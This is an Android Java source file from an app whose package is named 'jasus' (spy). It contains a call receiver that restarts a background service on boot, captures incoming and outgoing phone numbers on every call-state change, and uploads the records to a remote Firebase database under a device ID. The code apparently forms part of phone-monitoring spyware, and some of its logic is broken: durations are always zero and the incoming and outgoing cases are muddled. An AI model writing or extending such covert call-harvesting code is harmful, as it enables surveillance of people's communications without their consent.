package com.perry.jasus.BroadcastServices;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.perry.jasus.BackgroundServices.BackgroundBroadcastService;
import com.perry.jasus.Models.CallHistoryModel;
import com.perry.jasus.Util.LocalData;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashSet;


public class IncomingCall extends BroadcastReceiver {

    private DatabaseReference mDatabase ;
    private String lastNumber = "";
    private int lastDuration = 0;

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @SuppressLint({"UnsafeProtectedBroadcastReceiver", "SuspiciousIndentation"})
    @Override
    public void onReceive(Context context, Intent intent) {
        String deviceID = LocalData.getDeviceID();
        mDatabase =FirebaseDatabase.getInstance().getReference().child("Users").child(deviceID).child("Call");

        if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Intent serviceIntent = new Intent(context, BackgroundBroadcastService.class);
            context.startForegroundService(serviceIntent);
        }


        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
            // Incoming call ringing

            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            lastNumber = incomingNumber;
            lastDuration = 0;
        } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
            // Call answered

            if (lastNumber != null && !lastNumber.isEmpty()) {
                // Outgoing call answered
                uploadCallHistory("outgoing", lastNumber, "", lastDuration);
            } else {
                // Incoming call answered
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                uploadCallHistory("incoming", "", incomingNumber, lastDuration);
            }
        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
            // Call ended

            if (lastNumber != null && !lastNumber.isEmpty()) {
                // Outgoing call ended
                uploadCallHistory("outgoing", lastNumber, "", lastDuration);
            } else {
                // Incoming call ended
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                uploadCallHistory("incoming", "", incomingNumber, lastDuration);
            }
            lastNumber = "";
            lastDuration = 0;
        }
    }

    private void uploadCallHistory(String type, String callerNumber, String receiverNumber, int duration) {

        // Check if this call has already been uploaded

        Query query = mDatabase.orderByChild("duration").equalTo(duration);
        query.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                boolean foundDuplicate = false;
                for (DataSnapshot childSnapshot : snapshot.getChildren()) {
                    CallHistoryModel callHistory = childSnapshot.getValue(CallHistoryModel.class);
                    if (callHistory.getType().equals(type) &&
                            callHistory.getCallerNumber().equals(callerNumber) &&
                            callHistory.getReceiverNumber().equals(receiverNumber)) {
                        foundDuplicate = true;
                        break;
                    }
                }

                // If this call has not been uploaded yet, upload it
                if (!foundDuplicate) {
                    CallHistoryModel callHistory = new CallHistoryModel(type, callerNumber, receiverNumber, duration);
                    String key = mDatabase.push().getKey();
                    mDatabase.child(key).setValue(callHistory);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                // Handle error
            }
        });
    }
}